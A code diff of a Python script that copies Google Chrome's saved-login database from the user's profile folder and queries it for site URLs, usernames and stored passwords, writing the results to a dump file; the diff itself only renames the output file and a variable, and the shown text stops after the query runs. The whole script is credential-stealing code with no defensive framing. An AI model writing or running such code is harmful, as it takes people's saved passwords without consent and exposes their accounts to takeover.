@@ -1,15 +1,15 @@
 import os, sqlite3, win32crypt, time, shutil, sys
-file = open("dump.txt", "w")
+file = open("passdump.txt", "w")
 file.write("")
 file.close
 def logit(content):
-    file = open("dump.txt", "a")
+    file = open("passdump.txt", "a")
     file.write(content)
     file.close
 shutil.copyfile(os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data", "tempdatabase")
 path = os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default"
-db = os.path.join(os.path.abspath(os.path.split(sys.argv[0])[0]) + "/tempdatabase")
-c = sqlite3.connect(db)
+crdb = os.path.join(os.path.abspath(os.path.split(sys.argv[0])[0]) + "/tempdatabase")
+c = sqlite3.connect(crdb)
 cursor = c.cursor()
 select_statement = "SELECT origin_url, username_value, password_value FROM logins"
 cursor.execute(select_statement)
